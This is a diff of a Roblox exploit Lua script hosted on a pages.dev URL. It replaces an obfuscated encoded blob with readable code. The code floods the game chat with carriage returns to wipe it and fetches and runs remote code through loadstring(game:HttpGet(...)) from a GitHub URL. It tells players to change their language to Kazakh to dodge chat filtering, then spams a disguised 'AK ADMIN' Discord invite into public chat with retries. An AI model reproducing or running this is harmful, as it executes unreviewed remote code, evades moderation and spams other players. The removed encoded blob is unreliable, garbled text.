@@ -1,2 +1,126 @@
--- https://ichfickdeinemutta.pages.dev/Ad.lua
-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
+local TextChatService = game:GetService("TextChatService")
+local ReplicatedStorage = game:GetService("ReplicatedStorage")
+
+local function chatMessage(str)
+    str = tostring(str)
+    if TextChatService.ChatVersion == Enum.ChatVersion.TextChatService then
+        local generalChannel = TextChatService:FindFirstChild("TextChannels"):FindFirstChild("RBXGeneral")
+        if generalChannel then
+            generalChannel:SendAsync(str)
+        else
+            warn("RBXGeneral channel not found!")
+        end
+    else
+        local chatEvent = ReplicatedStorage:FindFirstChild("DefaultChatSystemChatEvents"):FindFirstChild("SayMessageRequest")
+        if chatEvent then
+            chatEvent:FireServer(str, "All")
+        else
+            warn("DefaultChatSystemChatEvents not found!")
+        end
+    end
+end
+
+local blob = "\u{000D}"
+local clearMessage = ""..string.rep(blob, 197)..""
+
+
+for i = 1, 1 do
+    chatMessage(clearMessage) 
+end
+
+
+
+loadstring(game:HttpGet("https://raw.githubusercontent.com/vqmpjayZ/More-Scripts/refs/heads/main/Anthony's%20ACL"))()
+
+wait(1)
+
+local StarterGui = game:GetService("StarterGui")
+local Players = game:GetService("Players")
+local player = Players.LocalPlayer
+
+-- Create notification
+StarterGui:SetCore("SendNotification", {
+    Title = "AK ADMIN",
+    Text = "You need to change your Roblox Language to Қазақ тілі so it won't get tagged",
+    Duration = 5
+})
+
+local TextChatService = game:GetService("TextChatService")
+local ReplicatedStorage = game:GetService("ReplicatedStorage")
+
+-- Function to send a chat message
+local function chatMessage(str)
+    str = tostring(str)
+    if TextChatService.ChatVersion == Enum.ChatVersion.TextChatService then
+        local generalChannel = TextChatService:FindFirstChild("TextChannels")
+        if generalChannel then
+            generalChannel = generalChannel:FindFirstChild("RBXGeneral")
+            if generalChannel then
+                generalChannel:SendAsync(str)
+            else
+                warn("RBXGeneral channel not found!") 
+            end
+        else
+            warn("TextChannels not found!")
+        end
+    else
+        local chatEvents = ReplicatedStorage:FindFirstChild("DefaultChatSystemChatEvents")
+        if chatEvents then
+            local chatEvent = chatEvents:FindFirstChild("SayMessageRequest")
+            if chatEvent then
+                chatEvent:FireServer(str, "All")
+            else
+                warn("SayMessageRequest event not found!")
+            end
+        else
+            warn("DefaultChatSystemChatEvents not found!")
+        end
+    end
+end
+
+-- Invisible character for new lines
+local blob = ""
+
+-- Formatted message (common for both systems)
+wait(0.1)
+local newMessage = 
+        blob .. "\r" ..
+        " ----------------🔥 AK ADMIN 🔥-------------  " .. blob .. "\r" ..
+        blob .. "\r" ..
+        blob .. "\r" ..
+        " JOIN NOW AT " .. blob .. "\r" ..
+        blob .. "\r" ..
+        "----------DISִCORD.GG/AKADMIN------------" 
+
+-- New message for the old chat system (without ASCII art)
+local oldMessage = "🔥AK ADMIN🔥 👉 .ĝĝ/akadmin 👈"
+
+
+-- Send the appropriate message based on the chat system
+local function sendMessage()
+    if TextChatService.ChatVersion == Enum.ChatVersion.TextChatService then
+        -- New chat system
+        chatMessage(newMessage)
+    else
+        -- Old chat system
+        chatMessage(oldMessage)
+    end
+end
+
+-- Retry mechanism in case the message fails to send
+local retries = 3
+while retries > 0 do
+    local success, err = pcall(sendMessage)
+    if success then
+        break
+    else
+        warn("Failed to send message: " .. err)
+        retries = retries - 1
+        wait(1) -- Wait before retrying
+    end
+end
+
+if retries == 0 then
+    warn("Failed to send message after multiple attempts.")
+end
+
